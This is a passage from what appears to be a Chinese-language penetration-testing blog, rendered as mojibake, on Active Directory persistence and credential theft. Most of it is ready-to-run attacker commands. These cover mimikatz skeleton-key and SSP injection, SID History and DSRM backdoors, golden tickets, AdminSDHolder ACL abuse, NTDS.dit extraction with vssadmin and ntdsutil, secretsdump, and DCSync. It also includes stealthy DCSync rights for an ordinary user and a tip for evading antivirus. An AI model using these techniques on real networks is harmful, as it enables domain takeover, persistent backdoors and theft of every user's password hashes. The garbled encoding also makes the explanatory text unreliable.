å¥ˆçš„æ˜¯æˆ‘æŠŠdllæ–‡ä»¶å†™å‡ºæ¥äº†ä¸”ç¡®ä¿æ˜¯æ­£ç¡®çš„ï¼Œåœ¨win7å’Œwin2012ä¸Šå¤ç°å‡å¤±è´¥ï¼Œç½‘ä¸ŠæˆåŠŸçš„ä¾‹å­æ˜¯win2008serverï¼Œå¯æƒœæˆ‘å¹¶æ²¡æœ‰è¿™ä¸ªç‰ˆæœ¬çš„è™šæ‹Ÿæœºä¸è¿‡åŸç†å€’æ˜¯æ‡‚äº†</p><h2 id="ä¸‡èƒ½å¯†ç "><a href="#ä¸‡èƒ½å¯†ç " class="headerlink" title="ä¸‡èƒ½å¯†ç "></a>ä¸‡èƒ½å¯†ç </h2><p>è¿ç”¨mimkatzå¯ä»¥åœ¨åŸŸæ§æœºä¸Šå¯¹æ‰€æœ‰ç”¨æˆ·æ·»åŠ ä¸€ä¸ªç»Ÿä¸€å¯†ç ç”¨æ¥ç™»å½•.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimikatz# misc::skeleton</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰€æœ‰ç”¨æˆ·éƒ½èƒ½ç”¨å¯†ç  mimiaktzç™»é™†äº†</p><h2 id="SSPæ³¨å…¥"><a href="#SSPæ³¨å…¥" class="headerlink" title="SSPæ³¨å…¥"></a>SSPæ³¨å…¥</h2><p>ssp:ä¸€ä¸ªDLLæ–‡ä»¶ï¼Œç”¨æ¥å®ç°Windowsèº«ä»½éªŒè¯åŠŸèƒ½ï¼Œæ¯”å¦‚kerberosï¼Œntlmã€‚ç³»ç»Ÿå¯åŠ¨æ—¶SSPä¼šè¢«è‡ªåŠ¨åŠ è½½å…¥lsass.exe<br>sspi:SSPçš„APIæ¥å£</p><p>å¦‚æœæˆ‘ä»¬è‡ªå®šä¹‰ä¸ªæ¶æ„dllæ–‡ä»¶è®©ä»–åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½åˆ°lsass.exe,å°±èƒ½å¾—åˆ°è¿›ç¨‹ä¸­çš„æ˜æ–‡å¯†ç </p><p>ä¸´æ—¶æ€§æ³¨å…¥(é‡å¯ä¾¿å¤±æ•ˆ)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimiaktz# misc::memssp</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå¦‚ä¸Šå‘½ä»¤, ç„¶ååªè¦ç›®æ ‡æœºå™¨ä¸é‡å¯ï¼Œåœ¨ç›®æ ‡æœºå™¨ä¸Šç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç å°†ä¼šè¢«è®°å½•åœ¨ C:\Windows\System32\mimilsa.log æ–‡ä»¶ä¸­ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133322.png" alt="QQæˆªå›¾20210217133322"></p><p>é•¿æœŸæ€§æ³¨å…¥ï¼ˆé‡å¯ä¸å¤±æ•ˆï¼‰</p><p>æŠŠ mimikatzä¸­çš„mimilib.dllæ”¾åˆ°ç³»ç»Ÿçš„C:\Windows\System32\ ç›®å½•ä¸‹ï¼Œå¹¶å°† mimilib.dll æ·»åŠ åˆ°æ³¨å†Œè¡¨ä¸­ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œå³ä½¿ç³»ç»Ÿé‡å¯ï¼Œä¹Ÿä¸ä¼šå½±å“æŒä¹…åŒ–æ•ˆæœã€‚</p><p>ä¿®æ”¹æ³¨å†Œè¡¨ HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa çš„ Security Packages é¡¹ï¼ŒåŠ è½½æ–°çš„DLLæ–‡ä»¶</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133335.png" alt="QQæˆªå›¾20210217133335"></p><p>ç”¨æˆ·åœ¨ç™»å½•æ—¶è¾“å…¥çš„è´¦å·å¯†ç å°†ä¼šè¢«è®°å½•åœ¨ C:\Windows\System32\kiwissp.log</p><h2 id="SID-Historyåé—¨"><a href="#SID-Historyåé—¨" class="headerlink" title="SID Historyåé—¨"></a>SID Historyåé—¨</h2><p>sid history:å½“æˆ‘ä»¬æŠŠåŸŸAçš„ç”¨æˆ·xè¿ç§»åˆ°åŸŸBæ—¶ï¼ŒBåŸŸä¸­xçš„sidä¼šå‘ç”Ÿæ”¹å˜ï¼Œéšå³è€Œæ¥çš„æ˜¯æƒé™ä¹Ÿä¼šå‘ç”Ÿæ”¹å˜ã€‚æ‰€ä»¥ä¸ºäº†é¿å…è¿™ç§æƒé™æ”¹å˜ï¼Œsid historyè¯ç”Ÿäº†ï¼Œ ç³»ç»Ÿä¼šå°†å…¶åŸæ¥çš„SIDæ·»åŠ åˆ°è¿ç§»åç”¨æˆ·çš„SID Historyå±æ€§ä¸­ï¼Œä½¿è¿ç§»åçš„ç”¨æˆ·ä¿æŒåŸæœ‰æƒé™ã€èƒ½å¤Ÿè®¿é—®å…¶åŸæ¥å¯ä»¥è®¿é—®çš„èµ„æº ã€‚</p><p>åœ¨åŸŸæ§ä¸Š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add &#x2F;sam:const27 &#x2F;new:administrator å°†administratorçš„SIDæ·»åŠ åˆ°const27çš„sid historyå±æ€§</span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥åœ¨åŸŸæ§ä¸ŠéªŒè¯å…¶sid historyæ˜¯å¦æ›´æ”¹æˆåŠŸ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module activedirectory</span><br><span class="line">Get-ADUser const27 -Properties sidhistory</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133438.png" alt="QQæˆªå›¾20210217133438"></p><p>å¯ä»¥å‘ç°ç°åœ¨æ˜¯æœ‰SIDHistoryå±æ€§äº†ã€‚è€Œä¸”æœ«å°¾çš„500é¢„ç¤ºç€ADMINæƒé™</p><h2 id="DSRMåé—¨"><a href="#DSRMåé—¨" class="headerlink" title="DSRMåé—¨"></a>DSRMåé—¨</h2><p>DSRMè´¦å·:æ¯ä¸ªåŸŸæ§ä¸Šéƒ½æœ‰ä¸€ä¸ªæœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·ä¹Ÿå°±æ˜¯DSRMè´¦æˆ·ï¼Œç”¨äºåœ¨åŸŸç¯å¢ƒå‡ºç°æ•…éšœæ—¶æœ¬åœ°ç™»å½•è¿›è¡Œä¿®å¤.å¯ä»¥åˆ©ç”¨è¿™ä¸ªè´¦æˆ·è¿›è¡ŒæŒä¹…åŒ–æ“ä½œã€‚ï¼ˆ å¦‚æœåŸŸæ§åˆ¶å™¨çš„ç³»ç»Ÿç‰ˆæœ¬ä¸ºWindows Server 2003ï¼Œåˆ™ä¸èƒ½ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡ŒæŒä¹…åŒ–æ“ä½œã€‚ ï¼‰</p><p>æˆ‘ä»¬å…ˆè®¾ç½®DSRMå¯†ç <br>åŸŸæ§ä¸Šè¾“å…¥ntdsutil<br>ç„¶åè¾“å…¥reset password on server null<br>ç„¶åé”®å…¥å¯†ç ï¼Œæœ€åæŒ‰qé€€å‡ºå³å¯</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133606.png" alt="QQæˆªå›¾20210217133606"></p><p>åœ¨mimikatzä¸­dumpæœ¬åœ°hashå¯ä»¥çœ‹åˆ°å¤šå‡ºæ¥ä¸ªAdministrator</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133631.png" alt="QQæˆªå›¾20210217133631"></p><p>ç„¶åè®¾ç½®DSRMç™»é™†æ–¹å¼<br>DSRMç™»é™†æ–¹å¼æœ‰ä¸‰ç§åˆ†åˆ«å¯¹åº”123.</p><ul><li>0ï¼šé»˜è®¤å€¼ï¼Œåªæœ‰å½“åŸŸæ§åˆ¶å™¨é‡å¯å¹¶è¿›å…¥DSRMæ¨¡å¼æ—¶ï¼Œæ‰å¯ä»¥ä½¿ç”¨DSRMç®¡ç†å‘˜è´¦å·</li><li>1ï¼šåªæœ‰å½“æœ¬åœ°ADã€DSæœåŠ¡åœæ­¢æ—¶ï¼Œæ‰å¯ä»¥ä½¿ç”¨DSRMç®¡ç†å‘˜è´¦å·ç™»å½•åŸŸæ§åˆ¶å™¨</li><li>2ï¼šåœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œéƒ½å¯ä»¥ä½¿ç”¨DSRMç®¡ç†å‘˜è´¦å·ç™»å½•åŸŸæ§åˆ¶å™¨</li></ul><p>æˆ‘ä»¬éœ€è¦å°†ä»–æ”¹æˆ2æ‰è¡Œã€‚powershellæ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure><p>å³å¯.ç„¶åç›´æ¥psexecç™»å½•(è¿™é‡Œç”¨çš„æ˜¯cs)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133652.png" alt="QQæˆªå›¾20210217133652"></p><p>æ³¨æ„å¡«Realmæ—¶è¦å¡«ä¸Šé¢dumpå‡ºsamæ—¶çš„åŸŸåï¼ˆè¿™é‡Œæ˜¯DCï¼‰</p><h2 id="å§”æ´¾åé—¨"><a href="#å§”æ´¾åé—¨" class="headerlink" title="å§”æ´¾åé—¨"></a>å§”æ´¾åé—¨</h2><p>è¿™ä¸ªå¾ˆç®€å•ï¼Œåˆ©ç”¨çº¦æŸæ€§å§”æ´¾æˆ–è€…åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æ”»å‡»å¾—åˆ°çš„ST2ä¿å­˜èµ·æ¥ï¼Œæˆ–è€…éçº¦æŸæ€§å§”æ´¾å¾—åˆ°çš„TGTï¼Œè¦ç”¨çš„æ—¶å€™åŠ è½½è¿›å†…å­˜å°±è¡Œäº†</p><h2 id="é»„é‡‘ç¥¨æ®ç”Ÿæˆ"><a href="#é»„é‡‘ç¥¨æ®ç”Ÿæˆ" class="headerlink" title="é»„é‡‘ç¥¨æ®ç”Ÿæˆ"></a>é»„é‡‘ç¥¨æ®ç”Ÿæˆ</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ææƒ</span><br><span class="line">privilege::debug</span><br><span class="line"> </span><br><span class="line">#ç”Ÿæˆé»„é‡‘ç¥¨æ®å¹¶å¯¼å…¥</span><br><span class="line">kerberos::golden &#x2F;user:administrator &#x2F;domain:const.com &#x2F;sid:å½“å‰ç”¨æˆ·sidå»æ‰æœ€åä¸€ä¸ªæ•°æ® &#x2F;krbtgt:krbtgtçš„hash &#x2F;ptt</span><br></pre></td></tr></table></figure><h2 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h2><p>AdminSDHolderæ˜¯ä¸€ä¸ªç‰¹æ®Šå®¹å™¨ï¼Œç”¨ä½œå—ä¿æŠ¤ç”¨æˆ·æˆ–ç»„çš„ACMæ¨¡æ¿ã€‚ADå®šæœŸæŠŠ AdminSDHolderå¯¹è±¡çš„ACL åº”ç”¨åˆ°æ‰€æœ‰å—ä¿æŠ¤ç”¨æˆ·æˆ–ç»„ä¸Šï¼Œé˜²æ­¢å…¶è¢«æœ‰æ„æˆ–æ•…æ„ä¿®æ”¹ã€‚ å¦‚æœèƒ½å¤Ÿä¿®æ”¹AdminSDHolderå¯¹è±¡çš„ACLï¼Œé‚£ä¹ˆä¿®æ”¹çš„æƒé™å°†è‡ªåŠ¨åº”ç”¨äºæ‰€æœ‰å—ä¿æŠ¤çš„ADè´¦æˆ·å’Œç»„ï¼Œè¿™å¯ä»¥ä½œä¸ºä¸€ä¸ªåŸŸç¯å¢ƒæƒé™ç»´æŒçš„æ–¹æ³• ã€‚</p><p>å¦‚ä½•å¯»æ‰¾å—ä¿æŠ¤ç”¨æˆ·æˆ–ç»„ï¼š</p><p>å—ä¿æŠ¤ç”¨æˆ·æˆ–ç»„çš„ <strong>AdminCountå±æ€§ä¸º1</strong> ã€‚ ä½†æ˜¯ï¼Œå¦‚æœå¯¹è±¡å·²ç§»å‡ºå—ä¿æŠ¤ç»„ï¼Œå…¶AdminCountå±æ€§ä»ä¸º1ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ‰å¯èƒ½è·å¾—æ›¾ç»æ˜¯å—ä¿æŠ¤ç»„çš„å¸æˆ·å’Œç»„ ã€‚</p><p>ä½¿ç”¨powerview.ps1<code>Get-NetUser -AdminCount</code>å³å¯è·å¾—å—ä¿æŠ¤ç”¨æˆ·<br><code>Get-NetGroup -AdminCount</code>å³å¯è·å¾—å—ä¿æŠ¤ç»„</p><p>å¦‚ä½•ä¿®æ”¹ADMINSDHOLDERçš„ACL</p><p>åŸŸç®¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤(powerview.ps1)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetSearchBase &quot;LDAP:&#x2F;&#x2F;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;CONST,DC&#x3D;COM&quot; -PrincipalIdentity xx -Verbose -Rights ALL</span><br><span class="line">ç»™AdminSDHoloderæ·»åŠ ä¸€æ¡ACL,è®©xxç”¨æˆ·è·å¾—å®Œå…¨æ§åˆ¶æƒ</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133841.png" alt="QQæˆªå›¾20210217133841"></p><p>ç„¶åé»˜è®¤ç­‰60åˆ†é’Ÿï¼Œå¾…ADMINSDHOLDERç”Ÿæ•ˆåï¼Œxxå°±è·å¾—æ‰€æœ‰å—ä¿æŠ¤å¯¹è±¡çš„å®Œå…¨æ§åˆ¶æƒäº†<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133909.png" alt="QQæˆªå›¾20210217133909"></p><h2 id="Ntds-dit"><a href="#Ntds-dit" class="headerlink" title="Ntds.dit"></a>Ntds.dit</h2><p>â€œNtds.ditæ–‡ä»¶æ˜¯åŸŸç¯å¢ƒä¸­åŸŸæ§ä¸Šä¼šæœ‰çš„ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ˜¯ä¸»è¦çš„æ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œå…¶æ–‡ä»¶è·¯å¾„ä¸ºåŸŸæ§çš„ %SystemRoot%\ntds\ntds.ditï¼Œæ´»åŠ¨ç›®å½•å§‹ç»ˆä¼šè®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æ–‡ä»¶ç¦æ­¢è¢«è¯»å–ã€‚Ntds.ditåŒ…æ‹¬ä½†ä¸é™äºæœ‰å…³åŸŸç”¨æˆ·ã€ç»„å’Œç»„æˆå‘˜èº«ä»½å’Œå‡­æ®ä¿¡æ¯ã€GPPç­‰ä¿¡æ¯ã€‚å®ƒåŒ…æ‹¬åŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼Œä¸ºäº†è¿›ä¸€æ­¥ä¿æŠ¤å¯†ç å“ˆå¸Œå€¼ï¼Œä½¿ç”¨å­˜å‚¨åœ¨SYSTEMæ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­çš„å¯†é’¥å¯¹è¿™äº›å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†ã€‚â€â€”â€”FREEBUF.whoamiã€Šå†…ç½‘æ¸—é€æµ‹è¯•ï¼šä»NTDS.ditè·å–åŸŸæ•£åˆ—å€¼ã€‹<br>æ’ä¸ªé¢˜å¤–è¯ï¼šéåŸŸçš„å·¥ä½œç»„ä¸»æœºå…¶å¯†ç ç­‰ä¿¡æ¯å­˜å‚¨åœ¨SAMä¸­ã€‚</p><p>æˆ‘ä»¬è·å–äº†åŸŸæ§åä¸€èˆ¬ç¬¬ä¸€æ­¥ä¾¿æ˜¯å¯¼å‡ºNtds.ditä¸­çš„ä¿¡æ¯,æ€ä¹ˆå¯¼å‡ºå‘¢ï¼Ÿ</p><h3 id="åˆ©ç”¨VSSå¯¼å‡º"><a href="#åˆ©ç”¨VSSå¯¼å‡º" class="headerlink" title="åˆ©ç”¨VSSå¯¼å‡º"></a>åˆ©ç”¨VSSå¯¼å‡º</h3><p>VSSå…¨ç§°ä¸ºVolume Shadow Copy Serviceï¼Œå·å½±æ‹·è´æœåŠ¡ï¼Œå±äºå¿«ç…§æŠ€æœ¯çš„ä¸€ç§ï¼Œä¸»è¦ç”¨äºå¤‡ä»½å’Œæ¢å¤ï¼Œå³ä½¿æ–‡ä»¶å¤„äºè¢«é”å®šçŠ¶æ€ã€‚</p><p>å…¶è·å–NTDS.DITçš„åŸºæœ¬æ­¥éª¤ä¸ºï¼š</p><p>åˆ›å»ºç›®æ ‡ä¸»æœºæ‰€æœ‰æ–‡ä»¶çš„å·å½±æ‹·è´ã€‚<br>åœ¨åˆ›å»ºçš„å·å½±æ‹·è´ä¸­å¤åˆ¶å‡ºNTDS.DITã€‚<br>åˆ é™¤å·å½±æ‹·è´ã€‚</p><h4 id="VSSADMIN"><a href="#VSSADMIN" class="headerlink" title="VSSADMIN"></a>VSSADMIN</h4><p>vssadminæ˜¯windowsä¸Šä¸€ä¸ªå‘½ä»¤è¡Œå·å½±æ‹·è´æœåŠ¡ç®¡ç†å·¥å…·ã€‚å…¶é€‚ç”¨äºï¼š Windows 10ï¼ŒWindows 8.1ï¼ŒWindows Server 2016ï¼ŒWindows Server 2012 R2ï¼ŒWindows Server 2012ï¼ŒWindows Server 2008 R2ï¼ŒWindows Server 2008</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729165404714.png" alt="image-20210729165404714"></p><p>å…¶å¯¼å‡ºNTDS.DITçš„æ–¹æ³•å¦‚ä¸‹</p><p>åˆ›å»ºä¸€ä¸ªCç›˜çš„å·å½±æ‹·è´</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow &#x2F;for&#x3D;c:</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729165602611.png" alt="image-20210729165602611"></p><p>ç„¶åå°†å·å½±ä¸­çš„ntds.ditå¤åˆ¶å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ é™¤å·å½±</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin delete shadows &#x2F;for&#x3D;c: &#x2F;quiet</span><br></pre></td></tr></table></figure><h4 id="Ntdsutil-exe"><a href="#Ntdsutil-exe" class="headerlink" title="Ntdsutil.exe"></a>Ntdsutil.exe</h4><p>Ntdsutil.exe æ˜¯ä¸€ä¸ªä¸º Active Directory æä¾›ç®¡ç†è®¾æ–½çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè¯¥å·¥å…·è¢«é»˜è®¤å®‰è£…åœ¨äº†åŸŸæ§åˆ¶å™¨ä¸Šï¼Œå¯ä»¥åœ¨åŸŸæ§ä¸Šç›´æ¥æ“ä½œï¼Œä¹Ÿå¯ä»¥é€šè¿‡åŸŸå†…æœºå™¨åœ¨åŸŸæ§ä¸Šè¿œç¨‹æ“ä½œï¼Œä½†æ˜¯éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p><p>ä¸ºWINDOWSä¸Šæ‰€æœ‰æ–‡ä»¶åˆ›å»ºå¿«ç…§</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729170339152.png" alt="image-20210729170339152"></p><p>æˆ‘ä»¬å¾—åˆ°äº†ä¸ªå¿«ç…§çš„IDï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦åŠ è½½è¿™ä¸ªå·å½±åˆ°æˆ‘ä»¬çš„ç£ç›˜ä¸­</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåå°±ä¼šå‘ç°è¿™ä¸ªå¿«ç…§åŠ è½½åˆ°äº†Cç›˜ä¸‹ï¼ˆè¿™é‡Œdirçœ‹åˆ°çš„NTDS.DITä¸æœ¬æ¬¡å®éªŒæ— å…³ï¼Œæ˜¯ä¸Šæ¬¡å®éªŒæ®‹ç•™ä¸‹æ¥æ²¡åˆ çš„ï¼‰</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729170830331.png" alt="image-20210729170830331"></p><p>ç„¶åå°†ntds.ditå¤åˆ¶å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy c:\$SNAP_202107291703_VOLUMEC$\Windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ é™¤å¿«ç…§</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; &quot;delete &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>åŒæ—¶ï¼ŒNTDSUTILè¿˜æœ‰ä¸€ä¸ªæ›´åŠ ä¾¿æ·çš„å¯¼å‡ºntds.ditçš„æ–¹æ³•ï¼šé€šè¿‡IFM<br>IFMä¸­æ–‡å«åª’ä½“å®‰è£…é›†ï¼Œåœ¨æˆ‘ä»¬é€šè¿‡NTDSUTILæ¥åˆ›å»ºåª’ä½“å®‰è£…é›†æ—¶ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œç”Ÿæˆå¿«ç…§ã€åŠ è½½ã€å°†ntds.ditã€è®¡ç®—æœºçš„SAMå’ŒSYSTEMæ–‡ä»¶å¤åˆ¶åˆ°ç›®æ ‡æ–‡ä»¶å¤¹ä¸­ç­‰æ“ä½œï¼Œéœ€ç®¡ç†å‘˜æƒé™ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:&#x2F;test&quot; q q </span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729171538273.png" alt="image-20210729171538273"></p><p>ç„¶ååœ¨C:\test\Active Directory\ntds.ditï¼Œå°±æ˜¯NTDS.DITï¼Œæˆ‘ä»¬å¤åˆ¶å‡ºæ¥å°±è¡Œäº†ã€‚<br>ç„¶åå†æŠŠtestæ–‡ä»¶å¤¹åˆ é™¤å³å¯ã€‚</p><h3 id="è§£æNTDS-DIT"><a href="#è§£æNTDS-DIT" class="headerlink" title="è§£æNTDS.DIT"></a>è§£æNTDS.DIT</h3><p>åœ¨æå–NTDS.DITåï¼Œæˆ‘ä»¬éœ€è¦å†æå–ä¸€ä¸ªæ–‡ä»¶system.hiveï¼Œå› ä¸ºsystem.hiveä¸­å­˜æ”¾ç€NTDS.DITçš„å¯†é’¥ï¼Œæœ‰äº†å®ƒæˆ‘ä»¬æ‰èƒ½è§£æNTDS.DITã€‚</p><p>å¯ä»¥ç”¨åˆšåˆšæåˆ°çš„VSSæ–¹æ³•è·å–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ä»¥ä¸‹å‘½ä»¤ä»æ³¨å†Œè¡¨ä¸­æ‹‰å–.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save hklm\system c:\system.hive</span><br></pre></td></tr></table></figure><h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><p>impacketæ¡†æ¶é›†æˆäº†è®¸å¤šå¥½ç©çš„ä¸œè¥¿ï¼Œä»–å…¶ä¸­çš„secretdump.pyè„šæœ¬å®ç°äº†è§£æntds.ditçš„åŠŸèƒ½</p><p>ç›´æ¥å†impacketçš„exampleä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\secretsdump.py -system .\system.hive -ntds .\ntds.dit local</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729235923711.png" alt="image-20210729235923711"></p><h3 id="è¿œç¨‹è§£æ"><a href="#è¿œç¨‹è§£æ" class="headerlink" title="è¿œç¨‹è§£æ"></a>è¿œç¨‹è§£æ</h3><h4 id="DCSYNC"><a href="#DCSYNC" class="headerlink" title="DCSYNC"></a>DCSYNC</h4><p>â€œDCSyncæ˜¯Mimikatzåœ¨2015å¹´æ·»åŠ çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œç”±Benjamin DELPY gentilkiwiå’ŒVincent LE TOUXå…±åŒç¼–å†™ï¼Œå…¶èƒ½å¤Ÿåˆ©ç”¨å·å½±æ‹·è´æœåŠ¡ç›´æ¥è¯»å–ndts.ditå¹¶å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„å“ˆå¸Œå€¼ã€‚éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚â€</p><p>è¿™ä¸ªä¸œè¥¿ å¯ä»¥å®ç°ä¸ç™»å½•åˆ°åŸŸæ§è€Œè·å–åŸŸæ§ä¸Šçš„æ•°æ®<br>è·å¾—ä»¥ä¸‹æƒé™å°±å¯ä»¥ä½¿ç”¨äº†</p><ul><li>Administratorsç»„å†…çš„ç”¨æˆ·</li><li>Domain Adminsç»„å†…çš„ç”¨æˆ·</li><li>Enterprise Adminsç»„å†…çš„ç”¨æˆ·</li><li>åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·</li></ul><p>ç„¶ååœ¨mimikatzé‡Œ<br>privilege::debug<br>lsadump::dcsync /user:xxxx /domain:xxxxx /csv å³å¯</p><p>æƒ³è·å–å…¨éƒ¨hashä¹Ÿå¯ä»¥lsadump::dcsync /domain:xxx.com /all /csv</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133813.png" alt="QQæˆªå›¾20210217133813"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡krbtgt hashåˆ¶ä½œé»„é‡‘ç¥¨æ®ç™»å½•administratorã€‚<br>å¦‚æœè¿˜æƒ³éšè”½ä¸€ç‚¹ï¼Œå¯ä»¥ç»™æ™®é€šç”¨æˆ·æ·»åŠ å¦‚ä¸‹ACE,ä½¿å…¶è·å¾—dcsyncæƒé™</p><ul><li></li><li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li><li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li><li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li></ul><p>å¯ä»¥ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œpowerview.ps1å®Œæˆä»¥ä¸Šæ“ä½œ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ç»™åŸŸç”¨æˆ·hackæ·»åŠ ä»¥ä¸Šä¸‰æ¡ACE</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose</span><br><span class="line"> </span><br><span class="line">#ç»™åŸŸç”¨æˆ·hackåˆ é™¤ä»¥ä¸Šä¸‰æ¡ACE</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure><p>ç„¶åæ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥ç”¨mimikatzè°ƒç”¨dcsyncå¯¼å‡ºhashäº†</p><h4 id="DCSYNCçš„powershellå®ç°"><a href="#DCSYNCçš„powershellå®ç°" class="headerlink" title="DCSYNCçš„powershellå®ç°"></a>DCSYNCçš„powershellå®ç°</h4><p>mimikatzå…æ€è¿‡ä¸å»çš„è¯å¯ä»¥è¯•è¯•è¿™ä¸ª<a href="https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1">https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -DumpForest | ft -wrap -autosize    &#x2F;&#x2F; å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hash</span><br><span class="line"></span><br><span class="line">Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      &#x2F;&#x2F; 